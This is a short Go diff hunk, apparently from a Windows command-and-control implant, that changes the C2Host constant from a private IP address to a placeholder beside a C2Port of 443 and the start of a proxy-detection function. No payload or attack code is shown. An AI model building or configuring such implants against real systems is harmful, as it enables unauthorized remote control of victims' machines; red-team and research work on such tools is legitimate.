@@ -25,7 +25,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
-const C2Host = "10.40.0.141"
+const C2Host = "IP_do_Server"
 const C2Port = "443"
 
 func detectProxy() string {
